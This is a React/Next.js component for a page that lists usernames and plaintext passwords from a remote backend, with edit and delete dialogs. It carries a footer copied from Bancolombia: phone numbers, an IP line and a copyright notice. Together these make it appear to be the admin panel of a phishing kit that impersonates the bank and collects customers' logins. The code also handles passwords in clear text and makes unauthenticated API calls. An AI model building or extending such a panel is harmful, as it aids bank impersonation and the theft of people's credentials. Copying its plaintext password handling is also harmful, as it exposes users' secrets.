'use client';

import { useEffect, useState } from 'react';
import { Open_Sans } from 'next/font/google';
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableRow, Button, Dialog, DialogActions, DialogContent, DialogContentText, DialogTitle, TextField } from "@mui/material";

const openSans = Open_Sans({ subsets: ['latin'] });

export default function UsersTable() {
  const [users, setUsers] = useState([]);
  const [error, setError] = useState('');
  const [openEdit, setOpenEdit] = useState(false);
  const [openDelete, setOpenDelete] = useState(false);
  const [selectedUser, setSelectedUser] = useState(null);
  const [editedUser, setEditedUser] = useState({});
  
  const url = 'https://backendproyecto-rnu0.onrender.com';

  useEffect(() => {
    async function fetchUsers() {
      try {
        const response = await fetch(`${url}/api/lista`);
        if (!response.ok) throw new Error('Failed to fetch data');
        const data = await response.json();
        setUsers(data);
      } catch (error) {
        setError(error.message);
      }
    }

    fetchUsers();
  }, []);

  const handleOpenEdit = (user) => {
    setSelectedUser(user);
    setEditedUser(user);
    setOpenEdit(true);
  };

  const handleCloseEdit = () => {
    setOpenEdit(false);
  };

  const handleOpenDelete = (user) => {
    setSelectedUser(user);
    setOpenDelete(true);
  };

  const handleCloseDelete = () => {
    setOpenDelete(false);
  };

  const handleEditChange = (e) => {
    const { name, value } = e.target;
    setEditedUser({
      ...editedUser,
      [name]: value
    });
  };

  const handleSubmitEdit = async () => {
    try {
      const response = await fetch(`${url}/api/actualizar/${editedUser._id}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(editedUser),
      });

      if (response.ok) {
        const updatedUsers = users.map((user) => user._id === editedUser._id ? editedUser : user);
        setUsers(updatedUsers);
        handleCloseEdit();
      } else {
        alert("Error al actualizar el usuario");
      }
    } catch (error) {
      console.error('Error al actualizar los datos:', error);
    }
  };

  const handleDeleteUser = async () => {
    try {
      const response = await fetch(`${url}/api/eliminar/${selectedUser._id}`, {
        method: 'DELETE',
      });

      if (response.ok) {
        const updatedUsers = users.filter(user => user._id !== selectedUser._id);
        setUsers(updatedUsers);
        handleCloseDelete();
      } else {
        alert("Error al eliminar el usuario");
      }
    } catch (error) {
      console.error('Error al eliminar los datos:', error);
    }
  };

  return (
    <div className={`min-h-screen flex flex-col bg-white ${openSans.className}`}>
      <header className="bg-background p-4 border-b border-border">
        <div className="max-w-7xl mx-auto">
          <h1 className="text-lg font-semibold text-black">Usuarios y Contraseñas</h1>
        </div>
      </header>

      <main className="flex-grow flex items-start justify-center px-4 sm:px-6 lg:px-8 pt-8">
        <div className="max-w-4xl w-full space-y-8">
          <Card>
            <CardHeader className="bg-black text-white py-[0.85em]">
              <CardTitle className="text-[1.03em]">Usuarios</CardTitle>
            </CardHeader>
            <CardContent className="pt-6">
              {error ? (
                <p className="text-red-500 text-sm">{error}</p>
              ) : (
                <Table>
                  <TableHead>
                    <TableRow>
                      <TableCell className="font-semibold">Usuario</TableCell>
                      <TableCell className="font-semibold">Contraseña</TableCell>
                      <TableCell className="font-semibold">Edición</TableCell>
                      <TableCell className="font-semibold">Eliminación</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {users.map((user) => (
                      <TableRow key={user._id}>
                        <TableCell>{user.usuario}</TableCell>
                        <TableCell>{user.clave}</TableCell>
                        <TableCell>
                          <Button onClick={() => handleOpenEdit(user)} variant="contained" sx={{background:"blue"}}>Editar</Button>
                          
                        </TableCell>
                        <TableCell><Button onClick={() => handleOpenDelete(user)} variant="contained" sx={{background:"red"}} style={{ marginLeft: '8px' }}>Eliminar</Button></TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              )}
            </CardContent>
          </Card>
        </div>
      </main>

      {/* Modal para editar */}
      <Dialog open={openEdit} onClose={handleCloseEdit}>
        <DialogTitle>Editar Usuario</DialogTitle>
        <DialogContent>
          <DialogContentText>Edita la información del usuario seleccionado.</DialogContentText>
          <TextField
            margin="dense"
            label="Usuario"
            name="usuario"
            fullWidth
            value={editedUser.usuario || ''}
            onChange={handleEditChange}
          />
          <TextField
            margin="dense"
            label="Calve"
            name="clave"
            fullWidth
            value={editedUser.clave || ''}
            onChange={handleEditChange}
          />
        </DialogContent>
        <DialogActions>
          <Button onClick={handleCloseEdit}>Cancelar</Button>
          <Button onClick={handleSubmitEdit}  sx={{color:"blue"}}>Guardar</Button>
        </DialogActions>
      </Dialog>

      {/* Modal para eliminar */}
      <Dialog open={openDelete} onClose={handleCloseDelete}>
        <DialogTitle>Eliminar Usuario</DialogTitle>
        <DialogContent>
          <DialogContentText>
            ¿Estás seguro de que deseas eliminar el siguiente usuario?
          </DialogContentText>
          {selectedUser && (
            <>
              <p><strong>Usuario:</strong> {selectedUser.usuario}</p>
              <p><strong>Clave:</strong> {selectedUser.clave}</p>
            </>
          )}
        </DialogContent>
        <DialogActions>
          <Button onClick={handleCloseDelete}>Cancelar</Button>
          <Button onClick={handleDeleteUser} sx={{color:"red"}}>Eliminar</Button>
        </DialogActions>
      </Dialog>

      <footer className="bg-background p-4 text-center text-xs text-muted-foreground border-t border-border" role="contentinfo">
        <p>
          Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00
        </p>
        <p>
          Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14
        </p>
        <p>Dirección IP: 181.143.198.86</p>
        <p>Copyright ©️ 2024 Bancolombia S.A.</p>
      </footer>
    </div>
  );
}
